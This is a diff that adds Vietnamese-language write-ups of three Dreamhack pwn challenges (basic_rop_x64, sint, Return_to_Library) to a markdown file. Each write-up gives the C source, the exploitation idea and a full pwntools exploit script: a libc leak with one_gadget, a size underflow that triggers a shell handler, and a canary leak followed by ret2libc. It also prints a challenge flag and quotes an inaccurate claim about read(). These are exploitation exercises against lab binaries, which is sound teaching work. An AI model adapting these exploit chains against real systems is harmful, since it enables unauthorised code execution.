@@ -965,3 +965,328 @@ r.interactive()
 ```
 
 </detials>
+
+# basic_rop_x64
+
+## Source c
+
+```c
+<details> <summary> Source C </summary>
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+
+void alarm_handler() {
+puts("TIME OUT");
+exit(-1);
+}
+
+void initialize() {
+setvbuf(stdin, NULL, \_IONBF, 0);
+setvbuf(stdout, NULL, \_IONBF, 0);
+
+    signal(SIGALRM, alarm_handler);
+    alarm(30);
+
+}
+
+int main(int argc, char \*argv[]) {
+char buf[0x40] = {};
+
+    initialize();
+
+    read(0, buf, 0x400);
+    write(1, buf, sizeof(buf));
+
+    return 0;
+
+}
+```
+
+</details>
+
+## Ý tưởng
+
+- Y hệt bài rop x86, không có canary, có file libc từ đề ta có thể dùng one_gadget để tạo shell nhanh chóng
+
+## Thực thi
+
+### Leak libc, tìm libc base
+
+- Ta tìm offset để ow saved rbp là 72, kiểm tra got thì có hàm puts, ta leak libc bằng cách dùng put@plt kèm với pop_rdi
+
+```python
+pop_rdi = 0x0000000000400883
+payload = b"a" * 72
+payload += p64(pop_rdi)
+payload += p64(exe.got['puts'])
+payload += p64(exe.plt['puts'])
+payload += p64(exe.sym['main'])
+r.sendline(payload)
+```
+
+- Tính libc base
+
+```python
+r.recvuntil(b"a" * 0x40)
+leak_libc = u64(r.recvline(keepends=False) + b"\0\0")
+log.info("leak libc: " + hex(leak_libc))
+libc.address = leak_libc - 456336
+```
+
+### one_gadget
+
+- Sau khi kiểm tra ở lệnh ret có thanh `rax = NULL` ta có thể sử dụng gadget `one_gadget = 0x45216`
+
+```python
+payload1 = b"a" * 72 + p64(libc.address + one_gadget)
+r.sendline(payload1)
+```
+
+## Kết quả
+
+![image](https://user-images.githubusercontent.com/111769169/227794396-2ca0de00-c3a4-438d-8740-a9065ae8096c.png)
+
+<details> <summary> full script </summary>
+
+```python
+from pwn import *
+exe = ELF("./basic_rop_x64_patched")
+libc = ELF("./libc.so.6")
+r = remote("host3.dreamhack.games", 22549)
+# r = process("./basic_rop_x64_patched")
+# gdb.attach(r, gdbscript='''
+#            b*main+67
+#            c
+#            ''')
+input()
+pop_rdi = 0x0000000000400883
+payload = b"a" * 72
+payload += p64(pop_rdi)
+payload += p64(exe.got['puts'])
+payload += p64(exe.plt['puts'])
+payload += p64(exe.sym['main'])
+r.sendline(payload)
+
+r.recvuntil(b"a" * 0x40)
+leak_libc = u64(r.recvline(keepends=False) + b"\0\0")
+log.info("leak libc: " + hex(leak_libc))
+libc.address = leak_libc - 456336
+one_gadget = 0x45216
+
+payload1 = b"a" * 72 + p64(libc.address + one_gadget)
+r.sendline(payload1)
+r.interactive()
+```
+
+</details>
+
+# sint
+
+## Source
+
+<details> <summary> Source </summary>
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+
+void alarm_handler()
+{
+    puts("TIME OUT");
+    exit(-1);
+}
+
+// void initialize()
+// {
+//     setvbuf(stdin, NULL, _IONBF, 0);
+//     setvbuf(stdout, NULL, _IONBF, 0);
+
+//     signal(SIGALRM, alarm_handler);
+//     alarm(30);
+// }
+
+void get_shell()
+{
+    system("/bin/sh");
+}
+
+int main()
+{
+    char buf[256];
+    int size;
+
+    // initialize();
+
+    signal(SIGSEGV, get_shell);
+
+    printf("Size: ");
+    scanf("%d", &size);
+    printf("%d\n", size);
+    if (size > 256 || size < 0)
+    {
+        printf("Buffer Overflow!\n");
+        exit(0);
+    }
+
+    printf("Data: ");
+    read(0, buf, size - 1);
+
+    return 0;
+}
+```
+
+<details>
+
+## Ý tưởng
+
+- Hướng đi của ta là sẽ gây lỗi `SIGSEGV` để thực thi shell, nghĩa là sẽ phải ow rip, gây lỗi `SIGSEGV`
+
+- Sau một thời gian nghĩ và thảo luận với nhau thì ta thấy ở hàm tham số thứ 3 của hàm read là `size - 1` (Số lượng phần tử để đọc) thường là số dương, vậy nếu ta nhập số 0 và thì tham số thứ 3 mang giá trị âm. Vậy có gây lỗi không?
+- Theo chat-gdb như sau
+
+```
+Nếu tham số nmemb có giá trị âm, hàm read() sẽ trả về -1 và đặt biến errno thành EINVAL, indicatinig một lỗi.
+```
+
+## Thực thi
+
+- Đầu tiên khi được hỏi size thì ta sẽ trả lời 0
+- Data: ta sẽ nhập thử 10 byte "a"
+
+```
+Size: 0
+Data: qqqqqqqqqqqq
+ls
+```
+
+- Chương trình lỗi nhưng chưa chiếm được shell, vì nếu nhập số lượng byte nhỏ hơn 256 của buf, chương trình chỉ nhận được lỗi `EINVAL` của read() mà ta chỉ chiếm được shell khi có lỗi `SIGSEGV`
+- Vậy nên ta sẽ nhập cỡ 280 byte "a"
+
+```
+Size: 0
+Data: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+ls
+flag
+sint
+cat flag
+DH{d66e84c453b960cfe37780e8ed9d70ab}
+```
+
+# Return_to_Library
+
+## Source
+
+<details> <summary> Source C </summary>
+
+```c
+// Name: rtl.c
+// Compile: gcc -o rtl rtl.c -fno-PIE -no-pie
+
+#include <stdio.h>
+#include <unistd.h>
+
+const char* binsh = "/bin/sh";
+
+int main() {
+  char buf[0x30];
+
+  setvbuf(stdin, 0, _IONBF, 0);
+  setvbuf(stdout, 0, _IONBF, 0);
+
+  // Add system function to plt's entry
+  system("echo 'system@plt");
+
+  // Leak canary
+  printf("[1] Leak Canary\n");
+  printf("Buf: ");
+  read(0, buf, 0x100);
+  printf("Buf: %s\n", buf);
+
+  // Overwrite return address
+  printf("[2] Overwrite return address\n");
+  printf("Buf: ");
+  read(0, buf, 0x100);
+
+  return 0;
+}
+```
+
+</details>
+
+## Ý tưởng
+
+- Bài này không có hàm tạo shell nhưng cung cấp cho ta hàm system, chuỗi /bin/sh, ta hoàn toàn có thể tạo shell
+
+```c
+const char* binsh = "/bin/sh";
+system("echo 'system@plt");
+```
+
+## Thực thi
+
+- Đầu tiên chương trình có canary và yêu cầu ta leak, bài này tương tự như một bài trước đó, do %s in đến byte 0x00 sẽ ngừng in, nên nếu ghi đè đến trước canary, còn byte 0x00 của canary nên không in ra được
+- Vậy, ta sẽ ghi đè byte 0x00 bằng byte 0x61, sau khi lấy được canary ta sẽ phải trừ đi 0x61 là byte ghi đè
+
+![image](https://user-images.githubusercontent.com/111769169/227799702-bd49823a-54aa-4c51-b46d-398b62073c8a.png)
+
+```python
+payload = b"a"*57
+r.sendafter(b"Buf: ", payload)
+r.recvuntil(b"a" * 56)
+canary = u64(r.recv(8))
+canary = canary - 0x61
+log.info("canary: " + hex(canary))
+```
+
+- Tiếp đó, ta sẽ sử dụng gadget `pop rdi và ret` để điều khiển chương trình, do chương trình cung cấp /bin/sh và system nên ta dễ dàng có được shell
+
+```python
+payload = b"a" * 56 + p64(canary)
+payload += b"a" * 8 + p64(ret) + p64(pop_rdi)
+payload += p64(next(exe.search(b'/bin/sh'))) + p64(exe.sym["system"])
+r.sendafter(b"Buf: ", payload)
+```
+
+## Kết quả
+
+![image](https://user-images.githubusercontent.com/111769169/227799897-578c6c6c-c248-45db-aeba-3cb06391686c.png)
+
+<details> <summary> full script </summary>
+
+```python
+from pwn import *
+
+exe = ELF("./rtl")
+r = remote("host3.dreamhack.games", 15274)
+# r = process(exe.path)
+# gdb.attach(r, gdbscript='''
+#            b*main+145
+#            c
+#            ''')
+input()
+pop_rdi = 0x0000000000400853
+ret = 0x0000000000400285
+
+payload = b"a"*57
+r.sendafter(b"Buf: ", payload)
+r.recvuntil(b"a" * 56)
+canary = u64(r.recv(8))
+canary = canary - 0x61
+log.info("canary: " + hex(canary))
+
+payload = b"a" * 56 + p64(canary)
+payload += b"a" * 8 + p64(ret) + p64(pop_rdi)
+payload += p64(next(exe.search(b'/bin/sh'))) + p64(exe.sym["system"])
+r.sendafter(b"Buf: ", payload)
+
+r.interactive()
+```
+
+</details>
+
+
+# abc
